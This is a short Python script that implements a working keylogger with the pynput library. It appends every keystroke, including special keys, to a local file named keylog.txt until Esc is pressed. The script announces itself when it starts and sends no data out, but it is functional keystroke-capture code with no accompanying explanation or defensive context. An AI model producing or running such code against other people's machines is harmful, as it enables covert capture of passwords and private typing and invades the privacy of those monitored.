from pynput.keyboard import Key, Listener

log_file = "keylog.txt" 

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(str(key.char))
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\\n")
            else:
                f.write(f"[{str(key).replace('Key.', '')}]")

def on_release(key):
    if key == Key.esc:
        return False

print(f"Keylogger started. Press 'Esc' to stop. Logging to {log_file}")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogger stopped.")